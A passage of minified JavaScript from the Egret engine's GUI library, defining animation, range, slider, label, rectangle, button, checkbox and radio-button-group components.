				this.caculateCurrentValue(b);
				null != this.updateFunction && this.updateFunction.call(this.thisObject, this);
				if (a = a >= this._duration)
					this.playedTimes++, this._isPlaying = !1, this.startTime = c.currentTime, 0 == this._repeatCount || this.playedTimes < this._repeatCount ? a = !1 : (c.removeAnimation(this), this._started =
								!1, this.playedTimes = 0);
				a && null != this.endFunction && this.endFunction.call(this.thisObject, this);
				return a
			};
			c.prototype.caculateCurrentValue = function (a) {
				this.easerFunction && (a = this.easerFunction(a));
				for (var b = this.motionPaths, c = b.length, d = 0; d < c; d++) {
					var e = b[d];
					this.currentValue[e.prop] = e.from + (e.to - e.from) * a
				}
			};
			c.addAnimation = function (a) {
				-1 == c.activeAnimations.indexOf(a) && (c.activeAnimations.push(a), c.registered || (c.registered = !0, d.Ticker.getInstance().register(c.onEnterFrame, null)))
			};
			c.removeAnimation =
			function (a) {
				a = c.activeAnimations.indexOf(a);
				-1 != a && (c.activeAnimations.splice(a, 1), a <= c.currentIntervalIndex && c.currentIntervalIndex--);
				0 == c.activeAnimations.length && c.registered && (c.registered = !1, d.Ticker.getInstance().unregister(c.onEnterFrame, null))
			};
			c.onEnterFrame = function (a, b) {
				c.currentTime = d.getTimer();
				for (c.currentIntervalIndex = 0; c.currentIntervalIndex < c.activeAnimations.length; )
					c.activeAnimations[c.currentIntervalIndex].doInterval(), c.currentIntervalIndex++;
				c.currentIntervalIndex = -1;
				0 == c.activeAnimations.length &&
				c.registered && (c.registered = !1, d.Ticker.getInstance().unregister(c.onEnterFrame, null))
			};
			c.currentTime = 0;
			c.TIMER_RESOLUTION = 1E3 / 60;
			c.activeAnimations = [];
			c.currentIntervalIndex = -1;
			return c
		}
		();
		e.Animation = f;
		f.prototype.__class__ = "egret.gui.Animation"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (d) {
		var f = function (c) {
			function a() {
				c.call(this);
				this._maximum = 100;
				this.maxChanged = !1;
				this._minimum = 0;
				this.minChanged = !1;
				this._stepSize = 1;
				this.stepSizeChanged = !1;
				this._changedValue = this._value = 0;
				this.valueChanged = !1;
				this._snapInterval = 1;
				this._explicitSnapInterval = this.snapIntervalChanged = !1
			}
			__extends(a, c);
			Object.defineProperty(a.prototype, "maximum", {
				get : function () {
					return this._maximum
				},
				set : function (b) {
					this._setMaximun(b)
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype._setMaximun =
			function (b) {
				b != this._maximum && (this._maximum = b, this.maxChanged = !0, this.invalidateProperties())
			};
			Object.defineProperty(a.prototype, "minimum", {
				get : function () {
					return this._minimum
				},
				set : function (b) {
					this._setMinimun(b)
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype._setMinimun = function (b) {
				b != this._minimum && (this._minimum = b, this.minChanged = !0, this.invalidateProperties())
			};
			Object.defineProperty(a.prototype, "stepSize", {
				get : function () {
					return this._stepSize
				},
				set : function (b) {
					b != this._stepSize && (this._stepSize =
							b, this.stepSizeChanged = !0, this.invalidateProperties())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "value", {
				get : function () {
					return this._getValue()
				},
				set : function (b) {
					this._setValue(b)
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype._setValue = function (b) {
				b != this.value && (this._changedValue = b, this.valueChanged = !0, this.invalidateProperties())
			};
			a.prototype._getValue = function () {
				return this.valueChanged ? this._changedValue : this._value
			};
			Object.defineProperty(a.prototype, "snapInterval", {
				get : function () {
					return this._snapInterval
				},
				set : function (b) {
					this._explicitSnapInterval = !0;
					b != this._snapInterval && (isNaN(b) ? (this._snapInterval = 1, this._explicitSnapInterval = !1) : this._snapInterval = b, this.stepSizeChanged = this.snapIntervalChanged = !0, this.invalidateProperties())
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype.commitProperties = function () {
				c.prototype.commitProperties.call(this);
				this.minimum > this.maximum && (this.maxChanged ? this._maximum = this._minimum : this._minimum = this._maximum);
				if (this.valueChanged || this.maxChanged || this.minChanged ||
					this.snapIntervalChanged) {
					var b = this.valueChanged ? this._changedValue : this._value;
					this.snapIntervalChanged = this.minChanged = this.maxChanged = this.valueChanged = !1;
					this.setValue(this.nearestValidValue(b, this.snapInterval))
				}
				this.stepSizeChanged && (this._explicitSnapInterval ? this._stepSize = this.nearestValidSize(this._stepSize) : (this._snapInterval = this._stepSize, this.setValue(this.nearestValidValue(this._value, this.snapInterval))), this.stepSizeChanged = !1)
			};
			a.prototype.nearestValidSize = function (b) {
				var a = this.snapInterval;
				if (0 == a)
					return b;
				b = Math.round(b / a) * a;
				return Math.abs(b) < a ? a : b
			};
			a.prototype.nearestValidValue = function (b, a) {
				if (0 == a)
					return Math.max(this.minimum, Math.min(this.maximum, b));
				var c = this.maximum - this.minimum,
				d = 1;
				b -= this.minimum;
				a != Math.round(a) && (d = (1 + a).toString().split("."), d = Math.pow(10, d[1].length), c *= d, b = Math.round(b * d), a = Math.round(a * d));
				var e = Math.max(0, Math.floor(b / a) * a),
				c = Math.min(c, Math.floor((b + a) / a) * a);
				return (b - e >= (c - e) / 2 ? c : e) / d + this.minimum
			};
			a.prototype.setValue = function (b) {
				this._value != b &&
				(isNaN(b) && (b = 0), !isNaN(this.maximum) && !isNaN(this.minimum) && this.maximum > this.minimum ? this._value = Math.min(this.maximum, Math.max(this.minimum, b)) : this._value = b, this.valueChanged = !1)
			};
			a.prototype.changeValueByStep = function (b) {
				"undefined" === typeof b && (b = !0);
				0 != this.stepSize && this.setValue(this.nearestValidValue(b ? this.value + this.stepSize : this.value - this.stepSize, this.snapInterval))
			};
			return a
		}
		(d.SkinnableComponent);
		d.Range = f;
		f.prototype.__class__ = "egret.gui.Range"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (e) {
		var f = function (c) {
			function a() {
				c.call(this);
				this._slideDuration = 300;
				this.needUpdateValue = !1;
				this.addEventListener(d.Event.ADDED_TO_STAGE, this.addedToStageHandler, this);
				this.addEventListener(d.TouchEvent.TOUCH_BEGIN, this.mouseDownHandler, this)
			}
			__extends(a, c);
			Object.defineProperty(a.prototype, "slideDuration", {
				get : function () {
					return this._slideDuration
				},
				set : function (b) {
					this._slideDuration = b
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "maximum", {
				get : function () {
					return this._maximum
				},
				set : function (b) {
					b != this._maximum && (this._setMaximun(b), this.invalidateDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "minimum", {
				get : function () {
					return this._minimum
				},
				set : function (b) {
					b != this._minimum && (this._setMinimun(b), this.invalidateDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "value", {
				get : function () {
					return this._getValue()
				},
				set : function (b) {
					b != this._getValue() && (this._setValue(b), this.invalidateDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype.setValue = function (b) {
				c.prototype.setValue.call(this, b);
				this.invalidateDisplayList()
			};
			a.prototype.pointToValue = function (b, a) {
				return this.minimum
			};
			a.prototype.changeValueByStep = function (b) {
				"undefined" === typeof b && (b = !0);
				var a = this.value;
				c.prototype.changeValueByStep.call(this, b);
				this.value != a && this.dispatchEventWith(d.Event.CHANGE)
			};
			a.prototype.partAdded = function (b, a) {
				c.prototype.partAdded.call(this, b, a);
				a == this.thumb ? (this.thumb.addEventListener(d.TouchEvent.TOUCH_BEGIN,
						this.thumb_mouseDownHandler, this), this.thumb.addEventListener(e.ResizeEvent.RESIZE, this.thumb_resizeHandler, this), this.thumb.addEventListener(e.UIEvent.UPDATE_COMPLETE, this.thumb_updateCompleteHandler, this), this.thumb.stickyHighlighting = !0) : a == this.track && (this.track.addEventListener(d.TouchEvent.TOUCH_BEGIN, this.track_mouseDownHandler, this), this.track.addEventListener(e.ResizeEvent.RESIZE, this.track_resizeHandler, this))
			};
			a.prototype.partRemoved = function (b, a) {
				c.prototype.partRemoved.call(this, b, a);
				a == this.thumb ? (this.thumb.removeEventListener(d.TouchEvent.TOUCH_BEGIN, this.thumb_mouseDownHandler, this), this.thumb.removeEventListener(e.ResizeEvent.RESIZE, this.thumb_resizeHandler, this), this.thumb.removeEventListener(e.UIEvent.UPDATE_COMPLETE, this.thumb_updateCompleteHandler, this)) : a == this.track && (this.track.removeEventListener(d.TouchEvent.TOUCH_BEGIN, this.track_mouseDownHandler, this), this.track.removeEventListener(e.ResizeEvent.RESIZE, this.track_resizeHandler, this))
			};
			a.prototype.updateDisplayList =
			function (b, a) {
				c.prototype.updateDisplayList.call(this, b, a);
				this.updateSkinDisplayList()
			};
			a.prototype.updateSkinDisplayList = function () {};
			a.prototype.addedToStageHandler = function (b) {
				this.updateSkinDisplayList()
			};
			a.prototype.track_resizeHandler = function (b) {
				this.updateSkinDisplayList()
			};
			a.prototype.thumb_resizeHandler = function (b) {
				this.updateSkinDisplayList()
			};
			a.prototype.thumb_updateCompleteHandler = function (b) {
				this.updateSkinDisplayList();
				this.thumb.removeEventListener(e.UIEvent.UPDATE_COMPLETE, this.thumb_updateCompleteHandler,
					this)
			};
			a.prototype.thumb_mouseDownHandler = function (b) {
				e.UIGlobals.stage.addEventListener(d.TouchEvent.TOUCH_MOVE, this.stage_mouseMoveHandler, this);
				e.UIGlobals.stage.addEventListener(d.TouchEvent.TOUCH_END, this.stage_mouseUpHandler, this);
				e.UIGlobals.stage.addEventListener(d.Event.LEAVE_STAGE, this.stage_mouseUpHandler, this);
				this.addEventListener(d.Event.ENTER_FRAME, this.onEnterFrame, this);
				b = this.thumb.globalToLocal(b.stageX, b.stageY, d.Point.identity);
				this._clickOffsetX = b.x;
				this._clickOffsetY = b.y;
				e.TrackBaseEvent.dispatchTrackBaseEvent(this,
					e.TrackBaseEvent.THUMB_PRESS);
				e.UIEvent.dispatchUIEvent(this, e.UIEvent.CHANGE_START)
			};
			a.prototype.onEnterFrame = function (b) {
				this.needUpdateValue && this.track && (this.updateWhenMouseMove(), this.needUpdateValue = !1)
			};
			a.prototype.updateWhenMouseMove = function () {
				if (this.track) {
					var b = this.track.globalToLocal(this._moveStageX, this._moveStageY, d.Point.identity),
					b = this.pointToValue(b.x - this._clickOffsetX, b.y - this._clickOffsetY),
					b = this.nearestValidValue(b, this.snapInterval);
					b != this.value && (this.setValue(b), this.validateDisplayList(),
						e.TrackBaseEvent.dispatchTrackBaseEvent(this, e.TrackBaseEvent.THUMB_DRAG), this.dispatchEventWith(d.Event.CHANGE))
				}
			};
			a.prototype.stage_mouseMoveHandler = function (b) {
				this._moveStageX = b.stageX;
				this._moveStageY = b.stageY;
				this.needUpdateValue || (this.needUpdateValue = !0)
			};
			a.prototype.stage_mouseUpHandler = function (b) {
				e.UIGlobals.stage.removeEventListener(d.TouchEvent.TOUCH_MOVE, this.stage_mouseMoveHandler, this);
				e.UIGlobals.stage.removeEventListener(d.TouchEvent.TOUCH_END, this.stage_mouseUpHandler, this);
				e.UIGlobals.stage.removeEventListener(d.Event.LEAVE_STAGE,
					this.stage_mouseUpHandler, this);
				this.removeEventListener(d.Event.ENTER_FRAME, this.updateWhenMouseMove, this);
				this.needUpdateValue && (this.updateWhenMouseMove(), this.needUpdateValue = !1);
				e.TrackBaseEvent.dispatchTrackBaseEvent(this, e.TrackBaseEvent.THUMB_RELEASE);
				e.UIEvent.dispatchUIEvent(this, e.UIEvent.CHANGE_END)
			};
			a.prototype.track_mouseDownHandler = function (b) {};
			a.prototype.mouseDownHandler = function (b) {
				e.UIGlobals.stage.addEventListener(d.TouchEvent.TOUCH_END, this.stage_mouseUpSomewhereHandler, this);
				e.UIGlobals.stage.addEventListener(d.Event.LEAVE_STAGE, this.stage_mouseUpSomewhereHandler, this);
				this.mouseDownTarget = b.target
			};
			a.prototype.stage_mouseUpSomewhereHandler = function (b) {
				e.UIGlobals.stage.removeEventListener(d.TouchEvent.TOUCH_END, this.stage_mouseUpSomewhereHandler, this);
				e.UIGlobals.stage.removeEventListener(d.Event.LEAVE_STAGE, this.stage_mouseUpSomewhereHandler, this);
				if (this.mouseDownTarget != b.target && b instanceof d.TouchEvent && this.contains(b.target)) {
					var a = b.target.localToGlobal(b.localX,
							b.localY);
					d.TouchEvent.dispatchTouchEvent(this, d.TouchEvent.TOUCH_TAP, b.touchPointID, a.x, a.y, b.ctrlKey, b.altKey, b.shiftKey, b.touchDown)
				}
				this.mouseDownTarget = null
			};
			return a
		}
		(e.Range);
		e.TrackBase = f;
		f.prototype.__class__ = "egret.gui.TrackBase"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (e) {
		var f = function (c) {
			function a() {
				c.call(this);
				this._showTrackHighlight = !0;
				this._pendingValue = 0;
				this._liveDragging = !0;
				this.maximum = 10
			}
			__extends(a, c);
			Object.defineProperty(a.prototype, "showTrackHighlight", {
				get : function () {
					return this._showTrackHighlight
				},
				set : function (b) {
					this._showTrackHighlight != b && (this._showTrackHighlight = b, this.trackHighlight && (this.trackHighlight.visible = b), this.invalidateDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "pendingValue", {
				get : function () {
					return this._pendingValue
				},
				set : function (b) {
					b != this._pendingValue && (this._pendingValue = b, this.invalidateDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype.setValue = function (b) {
				this._pendingValue = b;
				c.prototype.setValue.call(this, b)
			};
			a.prototype.animationUpdateHandler = function (b) {
				this.pendingValue = b.currentValue.value
			};
			a.prototype.animationEndHandler = function (b) {
				this.setValue(this.slideToValue);
				this.dispatchEventWith(d.Event.CHANGE);
				e.UIEvent.dispatchUIEvent(this, e.UIEvent.CHANGE_END)
			};
			a.prototype.stopAnimation = function () {
				this.animator.stop();
				this.setValue(this.nearestValidValue(this.pendingValue, this.snapInterval));
				this.dispatchEventWith(d.Event.CHANGE);
				e.UIEvent.dispatchUIEvent(this, e.UIEvent.CHANGE_END)
			};
			a.prototype.thumb_mouseDownHandler = function (b) {
				this.animator && this.animator.isPlaying && this.stopAnimation();
				c.prototype.thumb_mouseDownHandler.call(this, b)
			};
			Object.defineProperty(a.prototype, "liveDragging", {
				get : function () {
					return this._liveDragging
				},
				set : function (b) {
					this._liveDragging =
						b
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype.updateWhenMouseMove = function () {
				if (this.track) {
					var b = this.track.globalToLocal(this._moveStageX, this._moveStageY, d.Point.identity),
					b = this.pointToValue(b.x - this._clickOffsetX, b.y - this._clickOffsetY),
					b = this.nearestValidValue(b, this.snapInterval);
					b != this.pendingValue && (e.TrackBaseEvent.dispatchTrackBaseEvent(this, e.TrackBaseEvent.THUMB_DRAG), !0 == this.liveDragging ? (this.setValue(b), this.dispatchEventWith(d.Event.CHANGE)) : this.pendingValue = b)
				}
			};
			a.prototype.stage_mouseUpHandler =
			function (b) {
				c.prototype.stage_mouseUpHandler.call(this, b);
				!1 == this.liveDragging && this.value != this.pendingValue && (this.setValue(this.pendingValue), this.dispatchEventWith(d.Event.CHANGE))
			};
			a.prototype.track_mouseDownHandler = function (b) {
				this.enabled && (b = this.track.globalToLocal(b.stageX - (this.thumb ? this.thumb.width : 0) / 2, b.stageY - (this.thumb ? this.thumb.height : 0) / 2, d.Point.identity), b = this.pointToValue(b.x, b.y), b = this.nearestValidValue(b, this.snapInterval), b != this.pendingValue && (0 != this.slideDuration ?
						(this.animator || (this.animator = new e.Animation(this.animationUpdateHandler, this), this.animator.endFunction = this.animationEndHandler), this.animator.isPlaying && this.stopAnimation(), this.slideToValue = b, this.animator.duration = this.slideDuration * (Math.abs(this.pendingValue - this.slideToValue) / (this.maximum - this.minimum)), this.animator.motionPaths = [{
									prop : "value",
									from : this.pendingValue,
									to : this.slideToValue
								}
							], e.UIEvent.dispatchUIEvent(this, e.UIEvent.CHANGE_START), this.animator.play()) : (this.setValue(b), this.dispatchEventWith(d.Event.CHANGE))))
			};
			a.prototype.partAdded = function (b, a) {
				c.prototype.partAdded.call(this, b, a);
				a == this.trackHighlight && (this.trackHighlight.touchEnabled = !1, this.trackHighlight instanceof d.DisplayObjectContainer && (this.trackHighlight.touchChildren = !1), this.trackHighlight.visible = this._showTrackHighlight)
			};
			return a
		}
		(e.TrackBase);
		e.SliderBase = f;
		f.prototype.__class__ = "egret.gui.SliderBase"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (d) {
		var f = function (c) {
			function a() {
				c.call(this);
				this._maxDisplayedLines = 0;
				this.lastUnscaledWidth = NaN;
				this._padding = 0;
				this._paddingBottom = this._paddingTop = this._paddingRight = this._paddingLeft = NaN;
				this.addEventListener(d.UIEvent.UPDATE_COMPLETE, this.updateCompleteHandler, this)
			}
			__extends(a, c);
			a.prototype.updateCompleteHandler = function (b) {
				this.lastUnscaledWidth = NaN
			};
			Object.defineProperty(a.prototype, "maxDisplayedLines", {
				get : function () {
					return this._maxDisplayedLines
				},
				set : function (b) {
					this._maxDisplayedLines !=
					b && (this._maxDisplayedLines = b, this.invalidateSize(), this.invalidateDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "padding", {
				get : function () {
					return this._padding
				},
				set : function (b) {
					this._padding != b && (this._padding = b, this.invalidateSize(), this.invalidateDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "paddingLeft", {
				get : function () {
					return this._paddingLeft
				},
				set : function (b) {
					this._paddingLeft != b && (this._paddingLeft = b, this.invalidateSize(),
						this.invalidateDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "paddingRight", {
				get : function () {
					return this._paddingRight
				},
				set : function (b) {
					this._paddingRight != b && (this._paddingRight = b, this.invalidateSize(), this.invalidateDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "paddingTop", {
				get : function () {
					return this._paddingTop
				},
				set : function (b) {
					this._paddingTop != b && (this._paddingTop = b, this.invalidateSize(), this.invalidateDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "paddingBottom", {
				get : function () {
					return this._paddingBottom
				},
				set : function (b) {
					this._paddingBottom != b && (this._paddingBottom = b, this.invalidateSize(), this.invalidateDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype.measure = function () {
				this._invalidatePropertiesFlag && this.validateProperties();
				if (this.isSpecialCase())
					if (isNaN(this.lastUnscaledWidth))
						this._oldPreferHeight = this._oldPreferWidth = NaN;
					else {
						this.measureUsingWidth(this.lastUnscaledWidth);
						return
					}
				var b;
				isNaN(this.explicitWidth) ? 1E4 != this.maxWidth && (b = this.maxWidth) : b = this.explicitWidth;
				this.measureUsingWidth(b)
			};
			a.prototype.isSpecialCase = function () {
				return 1 != this._maxDisplayedLines && (!isNaN(this.percentWidth) || !isNaN(this.left) && !isNaN(this.right)) && isNaN(this.explicitHeight) && isNaN(this.percentHeight)
			};
			a.prototype.measureUsingWidth = function (b) {
				var a = this._textField.text;
				this._textChanged && (this._textField.text = this._text);
				var c = isNaN(this._padding) ? 0 : this._padding,
				d = isNaN(this._paddingLeft) ?
					c : this._paddingLeft,
				e = isNaN(this._paddingRight) ? c : this._paddingRight,
				f = isNaN(this._paddingTop) ? c : this._paddingTop,
				c = isNaN(this._paddingBottom) ? c : this._paddingBottom;
				this._textField.width = NaN;
				this._textField.height = NaN;
				isNaN(b) || (this._textField.width = b - d - e);
				this.measuredWidth = Math.ceil(this._textField.measuredWidth);
				this.measuredHeight = Math.ceil(this._textField.measuredHeight);
				0 < this._maxDisplayedLines && this._textField.numLines > this._maxDisplayedLines && (b = this._textField.lineSpacing, this.measuredHeight =
						(this._textField.size + b) * this._maxDisplayedLines - b);
				this.measuredWidth += d + e;
				this.measuredHeight += f + c;
				this._textField.text = a
			};
			a.prototype.updateDisplayList = function (b, a) {
				this.$updateDisplayList(b, a);
				var c = isNaN(this._padding) ? 0 : this._padding,
				d = isNaN(this._paddingLeft) ? c : this._paddingLeft,
				e = isNaN(this._paddingRight) ? c : this._paddingRight,
				f = isNaN(this._paddingTop) ? c : this._paddingTop,
				c = isNaN(this._paddingBottom) ? c : this._paddingBottom;
				this._textField.x = d;
				this._textField.y = f;
				if (this.isSpecialCase()) {
					var l =
						isNaN(this.lastUnscaledWidth) || this.lastUnscaledWidth != b;
					this.lastUnscaledWidth = b;
					if (l) {
						this._oldPreferHeight = this._oldPreferWidth = NaN;
						this.invalidateSize();
						return
					}
				}
				this._invalidateSizeFlag && this.validateSize();
				this._textField.visible || (this._textField.visible = !0);
				this._textField.width = b - d - e;
				d = a - f - c;
				this._textField.height = d;
				0 < this._maxDisplayedLines && this._textField.numLines > this._maxDisplayedLines && (e = this._textField.lineSpacing, this._textField.height = Math.min(d, (this._textField.size + e) * this._maxDisplayedLines -
							e))
			};
			return a
		}
		(d.TextBase);
		d.Label = f;
		f.prototype.__class__ = "egret.gui.Label"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (e) {
		var f = function (c) {
			function a() {
				c.call(this);
				this._fillColor = 16777215;
				this._fillAlpha = 1;
				this._strokeColor = 4473924;
				this._strokeAlpha = 0;
				this._strokeWeight = 1;
				this.touchChildren = !1
			}
			__extends(a, c);
			Object.defineProperty(a.prototype, "graphics", {
				get : function () {
					this._graphics || (this._graphics = new d.Graphics);
					return this._graphics
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype._render = function (b) {
				this._graphics && this._graphics._draw(b);
				c.prototype._render.call(this, b)
			};
			Object.defineProperty(a.prototype,
				"fillColor", {
				get : function () {
					return this._fillColor
				},
				set : function (b) {
					this._fillColor != b && (this._fillColor = b, this.invalidateDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "fillAlpha", {
				get : function () {
					return this._fillAlpha
				},
				set : function (b) {
					this._fillAlpha != b && (this._fillAlpha = b, this.invalidateDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "strokeColor", {
				get : function () {
					return this._strokeColor
				},
				set : function (b) {
					this._strokeColor != b &&
					(this._strokeColor = b, this.invalidateDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "strokeAlpha", {
				get : function () {
					return this._strokeAlpha
				},
				set : function (b) {
					this._strokeAlpha != b && (this._strokeAlpha = b, this.invalidateDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "strokeWeight", {
				get : function () {
					return this._strokeWeight
				},
				set : function (b) {
					this._strokeWeight != b && (this._strokeWeight = b, this.invalidateDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype._measureBounds = function () {
				var b = c.prototype._measureBounds.call(this),
				a = this.width,
				d = this.height;
				0 < b.x && (b.x = 0);
				0 < b.y && (b.y = 0);
				0 + a > b.right && (b.right = 0 + a);
				0 + d > b.bottom && (b.bottom = 0 + d);
				return b
			};
			a.prototype.updateDisplayList = function (b, a) {
				c.prototype.updateDisplayList.call(this, b, b);
				var d = this.graphics;
				d.clear();
				d.beginFill(this._fillColor, this._fillAlpha);
				0 < this._strokeAlpha && d.lineStyle(this._strokeWeight, this._strokeColor, this._strokeAlpha, !0, "normal", "square", "miter");
				d.drawRect(0, 0,
					b, a);
				d.endFill()
			};
			return a
		}
		(e.UIComponent);
		e.Rect = f;
		f.prototype.__class__ = "egret.gui.Rect"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (d) {
		var f = function (c) {
			function a() {
				c.call(this);
				this.hostComponentKey = "egret.gui.Button"
			}
			__extends(a, c);
			return a
		}
		(d.ButtonBase);
		d.Button = f;
		f.prototype.__class__ = "egret.gui.Button"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (d) {
		var f = function (c) {
			function a() {
				c.call(this);
				this.hostComponentKey = "egret.gui.ToggleButton"
			}
			__extends(a, c);
			return a
		}
		(d.ToggleButtonBase);
		d.ToggleButton = f;
		f.prototype.__class__ = "egret.gui.ToggleButton"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (d) {
		var f = function (c) {
			function a() {
				c.call(this);
				this.hostComponentKey = "egret.gui.CheckBox"
			}
			__extends(a, c);
			return a
		}
		(d.ToggleButtonBase);
		d.CheckBox = f;
		f.prototype.__class__ = "egret.gui.CheckBox"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (e) {
		var f = function (c) {
			function a() {
				c.call(this);
				this.radioButtons = [];
				this._enabled = !0;
				this._name = "_radioButtonGroup" + a.groupCount;
				a.groupCount++
			}
			__extends(a, c);
			Object.defineProperty(a.prototype, "enabled", {
				get : function () {
					return this._enabled
				},
				set : function (b) {
					if (this._enabled != b)
						for (this._enabled = b, b = 0; b < this.numRadioButtons; b++)
							this.getRadioButtonAt(b).invalidateSkinState()
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "numRadioButtons", {
				get : function () {
					return this.radioButtons.length
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "selectedValue", {
				get : function () {
					return this.selection ? null != this.selection.value ? this.selection.value : this.selection.label : null
				},
				set : function (b) {
					this._selectedValue = b;
					if (null == b)
						this._setSelection(null, !1);
					else
						for (var a = this.numRadioButtons, c = 0; c < a; c++) {
							var d = this.getRadioButtonAt(c);
							if (d.value == b || d.label == b) {
								this.changeSelection(c, !1);
								this._selectedValue = null;
								e.UIEvent.dispatchUIEvent(this, e.UIEvent.VALUE_COMMIT);
								break
							}
						}
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "selection", {
				get : function () {
					return this._selection
				},
				set : function (b) {
					this._selection != b && this._setSelection(b, !1)
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype.getRadioButtonAt = function (b) {
				return 0 <= b && b < this.numRadioButtons ? this.radioButtons[b] : null
			};
			a.prototype._addInstance = function (b) {
				function a(b, c) {
					var d = b.parent,
					f = c.parent;
					if (!d || !f)
						return 0;
					var u = b instanceof e.UIComponent ? b.nestLevel : -1,
					n = c instanceof e.UIComponent ? c.nestLevel : -1,
					q = 0,
					p = 0;
					d ==
					f && (q = "getElementIndex" in d && "ownerChanged" in b ? d.getElementIndex(b) : d.getChildIndex(b), p = "getElementIndex" in f && "ownerChanged" in c ? f.getElementIndex(c) : f.getChildIndex(c));
					return u > n || q > p ? 1 : u < n || p > q ? -1 : b == c ? 0 : a(d, f)
				}
				b.addEventListener(d.Event.REMOVED, this.radioButton_removedHandler, this);
				this.radioButtons.push(b);
				this.radioButtons.sort(a);
				for (var c = 0; c < this.radioButtons.length; c++)
					this.radioButtons[c]._indexNumber = c;
				this._selectedValue && (this.selectedValue = this._selectedValue);
				!0 == b.selected && (this.selection =
						b);
				b._radioButtonGroup = this;
				b.invalidateSkinState();
				this.dispatchEventWith("numRadioButtonsChanged")
			};
			a.prototype._removeInstance = function (b) {
				this.doRemoveInstance(b, !1)
			};
			a.prototype.doRemoveInstance = function (b, a) {
				"undefined" === typeof a && (a = !0);
				if (b) {
					for (var c = !1, e = 0; e < this.numRadioButtons; e++) {
						var f = this.getRadioButtonAt(e);
						c ? f._indexNumber -= 1 : f == b && (a && b.addEventListener(d.Event.ADDED, this.radioButton_addedHandler, this), b == this._selection && (this._selection = null), b._radioButtonGroup = null, b.invalidateSkinState(),
							this.radioButtons.splice(e, 1), c = !0, e--)
					}
					c && this.dispatchEventWith("numRadioButtonsChanged")
				}
			};
			a.prototype._setSelection = function (b, a) {
				"undefined" === typeof a && (a = !0);
				if (this._selection != b) {
					if (b)
						for (var c = this.numRadioButtons, f = 0; f < c; f++) {
							if (b == this.getRadioButtonAt(f)) {
								this.changeSelection(f, a);
								break
							}
						}
					else
						this.selection && (this._selection.selected = !1, this._selection = null, a && this.dispatchEventWith(d.Event.CHANGE));
